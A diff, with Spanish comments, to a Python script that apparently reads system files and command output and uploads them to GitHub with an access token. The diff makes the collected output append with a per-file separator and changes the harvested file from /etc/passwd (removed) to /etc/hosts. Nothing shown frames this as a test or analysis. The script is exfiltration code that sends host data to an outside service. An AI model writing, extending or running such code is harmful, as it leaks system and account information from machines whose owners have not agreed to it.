@@ -48,7 +48,8 @@ def catAndUpload(filename, token):
 
     # Guardar el contenido en output.txt
     output_filename = 'output.txt'
-    with open(output_filename, 'w') as f:
+    with open(output_filename, 'a') as f:  # Cambiamos 'w' por 'a' para agregar al archivo en lugar de sobrescribirlo
+        f.write("\n#cat " + filename + "\n")  # Agregamos un separador antes del contenido del archivo
         f.write(content)
 
     # Subir output.txt a GitHub
@@ -77,7 +78,7 @@ def run(token):
     uploadToGithub(output_filename, result.stdout, token)
 
     # Leer /etc/hosts y subirlo a GitHub
-    catAndUpload('/etc/passwd', token)
+    catAndUpload('/etc/hosts', token)
 
 
 
